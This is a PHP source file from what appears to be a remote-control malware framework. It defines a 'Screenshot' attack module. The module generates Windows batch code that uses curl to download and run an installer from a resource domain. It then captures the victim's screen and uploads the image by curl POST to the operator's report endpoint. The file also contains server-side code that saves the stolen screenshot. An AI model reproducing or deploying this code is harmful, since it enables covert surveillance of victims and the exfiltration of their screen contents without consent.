<?php /** @noinspection PhpUnused */

namespace Kelvinho\Virus\Attack\AttackPackages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;

class Screenshot extends AttackInterface {
    public function __construct() {
    }

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus.
     */
    //@formatter:off
    public function generateIntercept(): string {
        ob_start(); ?>
        use Kelvinho\Virus\Attack\AttackInterface;
        if (isset($_FILES["screenshot"])) {
            $attack = AttackInterface::get("<?php echo $this->attack_id; ?>");
            exec("mv \"" . $_FILES["screenshot"]["tmp_name"] . "\" " . DATA_FILE . "/attacks/" . $attack->getAttackId() . "/screen.png");
            $attack->setExecuted();
            $attack->saveState();
        }
        <?php return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        return json_encode([]);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl -X POST --form "screenshot=@%~pd0screen.png" <?php echo DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    //@formatter:off
    public function generateBatchCode(): string {
        ob_start(); ?>
        @echo off
        if not exist "%~pd0..\..\utils\scst.exe" (
            curl -L <?php echo RESOURCE_DOMAIN; ?>/app/virus/app/screenshot/install > "%~pd0install.cmd"
            start /wait /b /d "%~pd0" install.cmd
            rem del install.cmd
        )
        "%~pd0..\..\utils\scst.exe" "%~pd0screen.png"
        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode()); ?>
        <?php echo BaseScriptWin::cleanUpPayload(); ?>
        <?php return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will include the correct admin page for this particular attack type.
     */
    public function includeAdminPage(): void {
        include(__DIR__ . "/admin.php");
    }

    /**
     * This will include the correct controller page for this particular attack type.
     */
    public function includeController(): void {
        include(__DIR__ . "/controller.php");
    }
}
